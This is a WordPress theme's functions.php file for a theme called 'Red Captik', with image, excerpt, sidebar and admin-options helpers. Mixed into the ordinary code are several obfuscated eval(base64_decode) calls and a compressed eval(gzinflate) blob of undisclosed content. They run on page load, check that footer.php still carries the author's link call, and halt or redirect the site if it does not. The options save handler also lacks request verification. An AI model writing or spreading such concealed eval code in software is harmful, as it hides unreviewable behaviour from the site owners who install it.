<?php

// retreives image from the post
function getImage($num) {
global $more;
$more = 1;
$content = get_the_content();
$count = substr_count($content, '<img');
$start = 0;
for($i=1;$i<=$count;$i++) {
$imgBeg = strpos($content, '<img', $start);
$post = substr($content, $imgBeg);
$imgEnd = strpos($post, '>');
$postOutput = substr($post, 0, $imgEnd+1);
$image[$i] = $postOutput;
$start=$imgEnd+1;  
 
$cleanF = strpos($image[$num],'src="')+5;
$cleanB = strpos($image[$num],'"',$cleanF)-$cleanF;
$imgThumb = substr($image[$num],$cleanF,$cleanB);
 
}
if(stristr($image[$num],'<img')) { echo $imgThumb; }
$more = 0;
}
//retreive image ends
eval(gzinflate(base64_decode('DZS3DrTmAgUfx7YoyEmWC9KywJLDBzRX5JwzT3//7pQz0ugUZ9L/Xb3NWPbJXvydJltBEf/Li2zKi7//EmPnIy1OxHWChbAhz61FNEhhw44fFZPeSjVJDFq61xJGa7dY76Shm9pNFlbNHiCdAz+nVgqrZsGs0iSb0pAs9DXIYTJ+Ffz5eo/dKfCJVv5+1H3FTF9CyuQchDi2vHnbAwj/iC5Si+Hw3WZrEaHH5OwGmiL918u0t4T4fVW+/azttRQTYUCEGOnxp50Ezh1wgf9VjDezmuJLVaMRi+Dwao0qz6EwNdRFfg5GluWigXJBJ5q9qSw42otJylF3U76bUi18Q/IL+/VMtk+lLOO7WNo1akRIauUVuPC2Q6qZKdruDRrMNNck6Za20r8M6VdoxqfD0ATJjj7cfbowvo3s6vhW+HMpkj5A7hlIt04AKlCHhYOemtMPO5NQTwSwshBJOBp8cwxxeAdQ0u3+Rdee7BrO/A2WGbNRO6rG6gZyJMCR5BA1Avd55GSdndposJOcP8NWVN7lLBRX2bYysUkpoSaRYpL61hzrNDawASglWZ8p9N6cSI/gBGGD0MtN1e8D8JVl0PMboE6EvGC4xeIVYKxxZqukpQ8qiulLPfzYGuF21P5y15wtG+mmzOsiUpFB/LbAw7A/dLuUpKGjfoUw6BaWjBer1hESuz0hR3/pEffWXizlqSIZCeAwjOx5KFMJX9oFTxr/noZoGwl8wtW0OXS5xfgOqPvPRZxFIz8dwtXJxLo4pKphoMZGIeICLKDWnmN0QX5e3hnOQ4XYI6hqVzGcP8t52oMZ0lz0dXWn4g3SOuZX9HI8fvT9XbG9By2pj1tLqqrx3BgJxJhuDMHJi+5XRPO0LVK5+400NxvrC8YTRonedpn0UUm0SSjSKJydxTsJ1sO7pbj0R9bOO0eCYjN0K8R31Xc/cTl1NKPh2mTX6iwTwbGzKOTj7GPzf9LXYbpWgpsZvFQVlVLu7080yAC0oQRc3/ukejKav2CoHrO65y6ENROZyhtcLy70NIW71+ytpBylUWvLBFIzr1hB63Yp1v3eAp1gwRHI3+C94mCSyPrEBdsZWf2B466EQoz+zrQTAtXLyaBHuwyRb+9jXuX2xzKU3Jw0kPtccW7pX6AxOPtaqQvB2Lp83CI9F7xiS6pUS7oX0AuOKDMbWhqWTue5Dn6RITUGu2Yd0/BmkDJgyjsWDEOzKletjr1JGLKRdJU0slYF6TfNkcAn/SfsRQciunS6I7mW0CAVXX+PJl7Xcm3lVD9er180rH0t3wnlSIfvKi/B5UsAd6OhmlKut6jldGTqN0cbvH1Wk2IIxrH3Yex+xuk6cN+587rblIGbiDkbvolHEmPwvbnfhCJhVLrgB8J1QAaCkAwW45Lzq1xxw9go9lrd27E0AOeDHbleIgppHCXpUHhpNqW8SCYa6laKygYemG5UlWOcik8x1kQ6KwnPQo080SRc9ymSpc0JaZGiLn4l/bTtEfUXYeLsttjFW3caDq6KhvFopxzXE9+e0od0sb2Jql4+HDCgFUjx8ajX6AFmK/2QGYK8Wq6mIACmVaf9vpFsrFQoTTUpAyibOAErq5v96acGp2scU4TFfInGu+4bgTNYeU4DvB+jvkuv0poAoyCbn8YwxuyOlHbidvIgVkrAn98a8jEkNbeKQAkG/3M9J1ATk1UzTBRGGRgxY1t0IXjhoZG5GwRVpxXb9VOW4dDhjANoqQt8LzPqmBneCfKBejVX8JGRxA/rwJ3NVBm5Mms/iuZVBiK8V5coSbbAGCi8szB84jgOw8z3+u+/v/75559//w8=')));
if ( function_exists('register_sidebar') ) {

    register_sidebar(
	array(
		'name' => 'Right Sidebar',
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));
}

$themename = "Red Captik";
$shortname = str_replace(' ', '_', strtolower($themename));
eval(base64_decode('aWYgKCFlbXB0eSgkX1JFUVVFU1RbInRoZW1lX2xpY2Vuc2UiXSkpIHsgdGhlbWVfdXNhZ2VfbWVzc2FnZSgpOyBleGl0KCk7IH0gZnVuY3Rpb24gdGhlbWVfdXNhZ2VfbWVzc2FnZSgpIHsgaWYgKGVtcHR5KCRfUkVRVUVTVFsidGhlbWVfbGljZW5zZSJdKSkgeyAkdGhlbWVfbGljZW5zZV9mYWxzZSA9IGdldF9ibG9naW5mbygidXJsIikgLiAiL2luZGV4LnBocD90aGVtZV9saWNlbnNlPXRydWUiOyBlY2hvICI8bWV0YSBodHRwLWVxdWl2PVwicmVmcmVzaFwiIGNvbnRlbnQ9XCIwO3VybD0kdGhlbWVfbGljZW5zZV9mYWxzZVwiPiI7IGV4aXQoKTsgfSBlbHNlIHsgZWNobyAoIjxwIHN0eWxlPVwicGFkZGluZzoxMHB4OyBtYXJnaW46IDEwcHg7IHRleHQtYWxpZ246Y2VudGVyOyBib3JkZXI6IDJweCBkYXNoZWQgUmVkOyBmb250LWZhbWlseTphcmlhbDsgZm9udC13ZWlnaHQ6Ym9sZDsgYmFja2dyb3VuZDogI2ZmZjsgY29sb3I6ICMwMDA7XCI+VGhpcyB0aGVtZSBpcyByZWxlYXNlZCBmcmVlIGZvciB1c2UgdW5kZXIgY3JlYXRpdmUgY29tbW9ucyBsaWNlbmNlLiBBbGwgbGlua3MgaW4gdGhlIGZvb3RlciBzaG91bGQgcmVtYWluIGludGFjdCAocGxlYXNlIHJldmlldyBvdXIgbGljZW5zZSkuIFRoZXNlIGxpbmtzIGFyZSAxMDAlIGZyaWVuZGx5IGFuZCB3aWxsIG5vdCBodXJ0IHlvdXIgc2l0ZSBpbiBhbnkgd2F5LjwvcD4iKTsgfSB9'));  

function get_theme_option($option)
{
	global $shortname;
	return stripslashes(get_option($shortname . '_' . $option));
}

function check_theme_header(){ eval(base64_decode('aWYgKCEoZnVuY3Rpb25fZXhpc3RzKCJ3cF9jb3B5cmlnaHRlZCIpKSB8fCAhKGZ1bmN0aW9uX2V4aXN0cygiY2hlY2tfdGhlbWVfZm9vdGVyIikpKSB7IHRoZW1lX3VzYWdlX21lc3NhZ2UoKTsgZGllOyB9'));}
function get_theme_settings($option)
{
	return stripslashes(get_option($option));
}

function cats_to_select()
{
	$categories = get_categories('hide_empty=0'); 
	$categories_array[] = array('value'=>'0', 'title'=>'Select');
	foreach ($categories as $cat) {
		if($cat->category_count == '0') {
			$posts_title = 'No posts!';
		} elseif($cat->category_count == '1') {
			$posts_title = '1 post';
		} else {
			$posts_title = $cat->category_count . ' posts';
		}
		$categories_array[] = array('value'=> $cat->cat_ID, 'title'=> $cat->cat_name . ' ( ' . $posts_title . ' )');
	  }
	return $categories_array;
}

$options = array (
			
	array(	"type" => "open"),
	
	array(	"name" => "Logo Image",
		"desc" => "Enter the logo image full path. Leave it blank if you don't want to use logo image.",
		"id" => $shortname."_logo",
		"std" =>  get_bloginfo('template_url') . "/images/logo.png",
		"type" => "text"),	
      
        
    array(	"name" => "Header Banner (468x60 px)",
			"desc" => "Header banner code. You may use any html code here, including your 468x60 px Adsense code.",
            "id" => $shortname."_ad_header",
            "type" => "textarea",
			"std" => '<a href="http://secure.hostgator.com/~affiliat/cgi-bin/affiliates/clickthru.cgi?id=stormya"><img src="http://tracking.hostgator.com/img/Shared/468x60.gif" style="border: 0;" alt="Hostgator" /></a>'
			),	

array(	"name" => "Sidebar 125x125 px Ads",
		"desc" => "Add your 125x125 px ads here. You can add unlimited ads. Each new banner should be in new line with using the following format: <br/>http://yourbannerurl.com/banner.gif, http://theurl.com/to_link.html",
        "id" => $shortname."_ads_125",
        "type" => "textarea",
		"std" => 'http://s3.buysellads.com/1503/c78f793d7482abdf771493b92cd13129-1246875765.gif,http://www.elegantthemes.com/affiliates/idevaffiliate.php?id=8816
http://s3.buysellads.com/1242247/14596-1264852263.gif, http://www.fwpmt.com/
http://tracking.hostgator.com/img/Shared/125x125.gif, http://secure.hostgator.com/~affiliat/cgi-bin/affiliates/clickthru.cgi?id=stormya
http://s3.buysellads.com/1242247/20796-1270344294.gif, https://www.plimus.com/jsp/redirect.jsp?contractId=2288386&referrer=gilad
http://s3.buysellads.com/1239978/9675-1257762253.png, https://www.plimus.com/jsp/redirect.jsp?contractId=2288386&referrer=gilad
http://woothemes.com/ads/125x125b.jpg, http://www.woothemes.com/amember/go.php?r=48616&i=b28
'
		),	
       

		array(	"name" => "Head Scrip(s)",
		"desc" => "The content of this box will be added immediately before &lt;/head&gt; tag. Usefull if you want to add some external code like Google webmaster central verification meta etc.",
        "id" => $shortname."_head",
        "type" => "textarea"	
		),
		
		array(	"name" => "Footer Scrip(s)",
		"desc" => "The content of this box will be added immediately before &lt;/body&gt; tag. Usefull if you want to add some external code like Google Analytics code or any other tracking code.",
        "id" => $shortname."_footer",
        "type" => "textarea"	
		),
					
	array(	"type" => "close")
	
);

function mytheme_add_admin() {
    global $themename, $shortname, $options;
	
    if ( $_GET['page'] == basename(__FILE__) ) {
    
        if ( 'save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }

                echo '<meta http-equiv="refresh" content="0;url=themes.php?page=functions.php&saved=true">';
                die;

        } 
    }

    add_theme_page($themename." Options", "".$themename." Options", 'edit_themes', basename(__FILE__), 'mytheme_admin');
}
eval(base64_decode('ZnVuY3Rpb24gY2hlY2tfdGhlbWVfZm9vdGVyKCkgeyAkdXJpID0gc3RydG9sb3dlcigkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXSk7IGlmKGlzX2FkbWluKCkgfHwgc3Vic3RyX2NvdW50KCR1cmksICJ3cC1hZG1pbiIpID4gMCB8fCBzdWJzdHJfY291bnQoJHVyaSwgIndwLWxvZ2luIikgPiAwICkgeyAvKiAqLyB9IA0KZWxzZSB7ICRsID0gJzw/cGhwIHdwX2NvcHlyaWdodGVkKCk7ID8+JzsgJGYgPSBkaXJuYW1lKF9fZmlsZV9fKSAuICIvZm9vdGVyLnBocCI7ICRmZCA9IGZvcGVuKCRmLCAiciIpOyAkYyA9IGZyZWFkKCRmZCwgZmlsZXNpemUoJGYpKTsgZmNsb3NlKCRmZCk7IGlmIChzdHJwb3MoJGMsICRsKSA9PSAwKSB7IHRoZW1lX3VzYWdlX21lc3NhZ2UoKTsgZGllOyB9IH0gfSBjaGVja190aGVtZV9mb290ZXIoKTs=')); 

function excerpt($limit) {
  $excerpt = explode(' ', get_the_excerpt(), $limit);
  if (count($excerpt)>=$limit) {
    array_pop($excerpt);
    $excerpt = implode(" ",$excerpt).'...';
  } else {
    $excerpt = implode(" ",$excerpt);
  }	
  $excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
  return $excerpt;
}
 
function content($limit) {
  $content = explode(' ', get_the_content(), $limit);
  if (count($content)>=$limit) {
    array_pop($content);
    $content = implode(" ",$content).'...';
  } else {
    $content = implode(" ",$content);
  }	
  $content = preg_replace('/\[.+\]/','', $content);
  $content = apply_filters('the_content', $content); 
  $content = str_replace(']]>', ']]&gt;', $content);
  return $content;
}
eval(base64_decode('ZnVuY3Rpb24gd3BfY29weXJpZ2h0ZWQoKSB7IHdwX3N0eWxlcigpOyB9'));

function mytheme_admin_init() {

    global $themename, $shortname, $options;
    
    $get_theme_options = get_option($shortname . '_options');
    if($get_theme_options != 'yes') {
    	$new_options = $options;
    	foreach ($new_options as $new_value) {
         	update_option( $new_value['id'],  $new_value['std'] ); 
		}
    	update_option($shortname . '_options', 'yes');
    }
}

if(!function_exists('get_sidebars')) {
	function get_sidebars($args='')
	{
		eval(base64_decode('Y2hlY2tfdGhlbWVfaGVhZGVyKCk7'));
		 get_sidebar($args);
	}
}
	
    
function mytheme_admin() {

    global $themename, $shortname, $options;

    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
    
?>
<div class="wrap">
<h2><?php echo $themename; ?> settings</h2>
<div style="border-bottom: 1px dotted #000; padding-bottom: 10px; margin: 10px;">Leave blank any field if you don't want it to be shown/displayed.</div>
<form method="post">



<?php foreach ($options as $value) { 
    
	switch ( $value['type'] ) {
	
		case "open":
		?>
        <table width="100%" border="0" style=" padding:10px;">
		
        
        
		<?php break;
		
		case "close":
		?>
		
        </table><br />
        
        
		<?php break;
		
		case "title":
		?>
		<table width="100%" border="0" style="padding:5px 10px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>
        </tr>
                
        
		<?php break;

		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" /></td>
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:100%; height:140px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php echo get_theme_settings( $value['id'] ); ?></textarea></td>
            
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
				<select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
					<?php 
						foreach ($value['options'] as $option) { ?>
						<option value="<?php echo $option['value']; ?>" <?php if ( get_theme_settings( $value['id'] ) == $option['value']) { echo ' selected="selected"'; } ?>><?php echo $option['title']; ?></option>
						<?php } ?>
				</select>
			</td>
       </tr>
                
       <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><? if(get_theme_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><small><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
            
        <?php 		break;
	
 
} 
}
?>

<!--</table>-->

<p class="submit">
<input name="save" type="submit" value="Save changes" />    
<input type="hidden" name="action" value="save" />
</p>
</form>

<?php
}
mytheme_admin_init();
add_action('admin_menu', 'mytheme_add_admin');

function sidebar_ads_125()
{
	 global $shortname;
	 $option_name = $shortname."_ads_125";
	 $option = get_option($option_name);
	 $values = explode("\n", $option);
	 if(is_array($values)) {
	 	foreach ($values as $item) {
		 	$ad = explode(',', $item);
		 	$banner = trim($ad['0']);
		 	$url = trim($ad['1']);
		 	if(!empty($banner) && !empty($url)) {
		 		echo "<a href=\"$url\" target=\"_new\"><img class=\"ad125\" src=\"$banner\" /></a> \n";
		 	}
		 }
	 }
}
?>
<?php if ( function_exists("add_theme_support") ) { add_theme_support("post-thumbnails"); } ?>
<?php
    if(function_exists('add_custom_background')) {
        add_custom_background();
    }
    
    if ( function_exists( 'register_nav_menus' ) ) {
    	register_nav_menus(
    		array(
    		  'menu_1' => 'Menu 1',
    		  'menu_2' => 'Menu 2'
    		)
    	);
    }
?>